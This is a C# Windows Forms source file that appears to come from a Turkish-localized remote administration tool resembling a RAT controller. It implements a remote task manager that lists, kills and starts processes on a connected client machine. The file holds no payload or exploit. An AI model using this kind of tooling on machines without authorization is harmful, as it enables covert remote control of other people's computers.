using System;
using System.Windows.Forms;
using xServer.Kontroller;
using xServer.KuuhakuCekirdek.Yardımcılar;
using xServer.KuuhakuCekirdek.Ağ;
using xServer.KuuhakuCekirdek.Paketler.ServerPaketleri;

namespace xServer.Formlar
{
    public partial class FrmGörevYöneticisi : Form
    {
        private readonly Client _connectClient;

        public FrmGörevYöneticisi(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmTm = this;

            InitializeComponent();
        }

        private void FrmTaskManager_Load(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                this.Text = PencereYardımcısı.GetWindowTitle("Görev Yöneticisi", _connectClient);
                new KuuhakuCekirdek.Paketler.ServerPaketleri.GetProcesses().Execute(_connectClient);
            }
        }

        private void FrmTaskManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_connectClient.Value != null)
                _connectClient.Value.FrmTm = null;
        }

        public void ClearListviewItems()
        {
            try
            {
                lstTasks.Invoke((MethodInvoker) delegate { lstTasks.Items.Clear(); });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void AddProcessToListview(string processName, int pid, string windowTitle)
        {
            try
            {
                ListViewItem lvi = new ListViewItem(new[]
                {
                    processName, pid.ToString(), windowTitle
                });

                lstTasks.Invoke((MethodInvoker) delegate { lstTasks.Items.Add(lvi); });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void SetProcessesCount(int processesCount)
        {
            try
            {
                statusStrip.Invoke(
                    (MethodInvoker) delegate { processesToolStripStatusLabel.Text = "İşlemler:: " + processesCount; });
            }
            catch (InvalidOperationException)
            {
            }
        }

        #region "ContextMenuStrip"

        private void killProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                foreach (ListViewItem lvi in lstTasks.SelectedItems)
                {
                    new DoProcessKill(int.Parse(lvi.SubItems[1].Text)).Execute(_connectClient);
                }
            }
        }

        private void startProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string processname = string.Empty;
            if (InputBox.Show("İşlemadı", "İşlem Adı Giriniz:", ref processname) == DialogResult.OK)
            {
                if (_connectClient != null)
                    new DoProcessStart(processname).Execute(_connectClient);
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                new GetProcesses().Execute(_connectClient);
            }
        }

        #endregion

        private void lstTasks_SelectedIndexChanged(object sender, EventArgs e)
        {

        }
    }
}